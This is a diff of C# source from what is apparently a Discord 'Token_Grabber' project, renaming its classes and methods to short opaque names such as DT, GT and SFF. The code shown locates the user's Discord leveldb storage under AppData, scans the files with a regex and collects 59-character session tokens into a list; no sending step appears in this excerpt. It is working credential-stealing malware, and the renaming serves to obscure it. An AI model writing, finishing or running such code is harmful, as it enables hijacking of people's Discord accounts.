@@ -1,28 +1,16 @@
 using System.Text.RegularExpressions;
 using Token_Grabber;
 
-public class FindToken
+public class DT
 {
-    public static void Main()
+    public static List<string> ptkns = new List<string>();
+    public DT()
     {
-        new DiscordToken();
-        new PrintAllInfo();
+        GT();
     }
-}
-public class DiscordToken
-{
-
-    public static List<string> matchs = new List<string>();
-    public DiscordToken()
+    public static void GT()
     {
-        GetToken();
-    }
-    /// <summary>
-    /// Name pretty much explains it
-    /// </summary>
-    public static void GetToken()
-    {
-        var files = SearchForFile();
+        var files = SFF();
         if (files.Count == 0)
         {
             Environment.Exit(0);
@@ -35,13 +23,13 @@ public class DiscordToken
                 if (match.Length == 59)
                 {
                     
-                    matchs.Add(match.ToString());
-                    matchs.ToArray();
+                    ptkns.Add(match.ToString());
+                    ptkns.ToArray();
                 }
             }
         }
     }
-    private static List<string> SearchForFile()
+    private static List<string> SFF()
     {
         List<string> ldbFiles = new List<string>();
         string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Discord\\Local Storage\\leveldb\\";
